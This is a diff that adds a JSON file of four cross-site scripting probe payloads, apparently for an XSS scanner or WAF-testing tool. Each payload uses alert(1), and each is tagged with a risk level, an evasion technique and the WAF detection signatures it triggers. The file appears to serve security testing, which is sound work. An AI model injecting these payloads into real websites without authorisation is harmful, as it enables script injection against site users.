@@ -1,0 +1,47 @@
+[
+    {
+        "payload": "<script>alert(1)</script>",
+        "risk": "MEDIUM",
+        "evasion": [
+            "HTML Tag Injection"
+        ],
+        "waf_detection": [
+            "WAF detects script tag signature",
+            "Suspicious JavaScript execution"
+        ]
+    },
+    {
+        "payload": "<img src=x onerror=alert(1)>",
+        "risk": "HIGH",
+        "evasion": [
+            "Event Handler Injection",
+            "HTML Tag Injection"
+        ],
+        "waf_detection": [
+            "WAF detects event handler injection",
+            "Suspicious JavaScript execution"
+        ]
+    },
+    {
+        "payload": "'><svg/onload=alert(1)>",
+        "risk": "HIGH",
+        "evasion": [
+            "Event Handler Injection",
+            "HTML Tag Injection"
+        ],
+        "waf_detection": [
+            "Suspicious JavaScript execution"
+        ]
+    },
+    {
+        "payload": "<body onload=alert(1)>",
+        "risk": "HIGH",
+        "evasion": [
+            "Event Handler Injection",
+            "HTML Tag Injection"
+        ],
+        "waf_detection": [
+            "Suspicious JavaScript execution"
+        ]
+    }
+]
